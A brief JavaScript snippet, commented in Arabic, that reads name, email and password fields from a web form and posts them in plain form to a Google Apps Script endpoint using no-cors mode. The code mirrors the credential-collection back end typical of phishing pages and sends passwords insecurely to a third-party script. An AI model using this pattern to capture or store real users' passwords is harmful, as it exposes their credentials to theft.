 <script>
  function send() {
    const name = document.getElementById("name").value;
    const email = document.getElementById("email").value;
    const pass = document.getElementById("pass").value;

    const url = "https://script.google.com/macros/s/AKfycbzomi9hwCrkqLbF4cUXe9pdZCfPiR2ccNwY6hxQAaqgzgGPwaUEcQuLi6kmeD9Lq1O6lw/exec";

    fetch(url, {
      method: "POST",
      mode: "no-cors",  // 👈 تجنب CORS error
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: `name=${encodeURIComponent(name)}&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`
    })
    .then(() => {
      console.log("✅ تم الإرسال! (بدون رد بسبب no-cors)");
    })
    .catch((error) => {
      console.error("❌ خطأ:", error);
    });
  }
</script>
